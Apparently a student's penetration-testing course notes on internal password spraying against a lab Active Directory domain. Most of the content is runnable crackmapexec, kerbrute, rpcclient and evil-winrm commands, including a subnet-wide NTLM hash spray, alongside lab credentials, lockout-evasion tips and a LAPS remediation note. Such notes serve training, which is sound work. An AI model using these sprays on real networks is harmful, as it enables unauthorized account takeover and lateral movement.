# Section 11 — Internal Password Spraying from Linux

---

## QUICK REFERENCE — Full Attack Chain

```bash
# STEP 1 — Get policy (section 09)
nxc smb 172.16.5.5 -u USER -p PASS --pass-pol

# STEP 2 — Build user list (section 10)
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt

# STEP 3 — Spray (pipe grep + for hits only)
crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Welcome1' | grep +

# STEP 4 — Validate hit
nxc smb 172.16.5.5 -u avazquez -p Password123

# STEP 5 — Test hit against other services
evil-winrm -i 172.16.5.5 -u avazquez -p Password123
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --shares
```
> Always get the password policy first — one wrong number of attempts locks accounts. `crackmapexec smb` sprays the password against every username in the file. `| grep +` hides all the failures so only successful logins appear. Always validate hits and immediately test them against WinRM and SMB shares.

---

## Lab Results (INLANEFREIGHT.LOCAL)

| Account | Password | Found By |
|---------|----------|----------|
| avazquez | `Password123` | crackmapexec spray |
| sgage | `Welcome1` | crackmapexec spray |
| tjohnson | `Welcome1` | crackmapexec spray |

---

## Method 1 — CrackMapExec (Preferred)

```bash
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
> Pass the username file with `-u` and a single password with `-p`. CrackMapExec tries every username. `| grep +` filters to only show lines with a `+` which marks successful logins.

`| grep +` = only shows successes, filters all failures. Essential for large lists.

---

## Method 2 — Kerbrute

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
> Sprays one password against all usernames using Kerberos instead of SMB. Faster than rpcclient. Note: failed spray attempts **do count** toward the lockout threshold, unlike username enumeration.

Faster than rpcclient. Failed attempts count toward lockout threshold.

---

## Method 3 — rpcclient One-Liner

```bash
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
> Loops through every username and tries to log in via RPC with the given password. `-c "getusername;quit"` runs a command and exits immediately. `grep Authority` shows only the lines that contain a successful authentication response.

`grep Authority` = shows only successful logins.

---

## Local Admin Password Reuse

If you recover a local admin hash or password, spray it across the subnet:

```bash
# --local-auth = prevents domain account lockout
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H NTLM_HASH | grep +
# Pwn3d! = local admin access confirmed
```
> `--local-auth` authenticates as a local account instead of a domain account. This is critical — without it, failed attempts can lock out the domain account. `-H` accepts an NTLM hash instead of a plaintext password. `Pwn3d!` in the output means you have local admin on that host.

**Naming pattern tips:**
- Password on workstation → try similar pattern on servers
- Local `bsmith` → try same password for domain `bsmith`
- Domain `ajones` → try `ajones_adm`
- Valid in Domain A → test same username in Domain B

**Remediation:** Microsoft LAPS — unique rotating local admin passwords per host.

**Stealth note:** Subnet-wide local admin spraying is very noisy — avoid during evasive assessments.

---

## Exam Notes

- `| grep +` with crackmapexec = only successes — always use it
- `--local-auth` is critical when spraying local hashes — prevents domain lockout
- `Pwn3d!` = local admin access
- Valid hit → test SMB shares, WinRM, RDP, MSSQL immediately
- Log: time, date, accounts targeted, password used
